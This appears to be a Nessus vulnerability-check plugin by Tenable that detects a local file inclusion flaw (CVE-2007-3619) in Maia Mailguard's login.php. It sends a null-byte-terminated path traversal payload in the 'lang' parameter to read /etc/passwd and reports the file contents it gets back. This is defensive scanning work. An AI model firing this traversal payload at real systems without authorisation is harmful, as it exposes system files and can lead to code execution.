#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25673);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2007-3619");
  script_bugtraq_id(24770);
  script_osvdb_id(37884);

  script_name(english:"Maia Mailguard login.php lang Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file with Maia Mailguard");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
local file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Maia Mailguard, a spam and virus management
system written in PHP. 

The version of Maia Mailguard installed on the remote host fails to
sanitize user input to the 'lang' parameter before using it to include
PHP code in 'login.php'.  Regardless of PHP's 'register_globals'
setting, an unauthenticated, remote attacker may be able to exploit
this issue to view arbitrary files or to execute arbitrary PHP code on
the remote host, subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2007/Jul/40" );
 script_set_attribute(attribute:"see_also", value:"http://www.maiamailguard.org/maia/ticket/479" );
 script_set_attribute(attribute:"see_also", value:"http://www.maiamailguard.org/maia/changeset/1184" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch from Changeset 1184." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/07/06");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/07/06");
 script_cvs_date("$Date: 2016/10/27 15:03:54 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/mailguard", "/maia", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to retrieve a local file.
  file = "/../../../../../../../../../../../../etc/passwd%00";
  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/login.php?",
      "lang=", file, ".txt"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error because magic_quotes was enabled or...
    egrep(pattern:"main\(\): Failed opening required .+/etc/passwd\\0\.txt", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(\): Failed opening required .+/etc/passwd' ", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br />");
    else contents = "";

    if (contents)
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
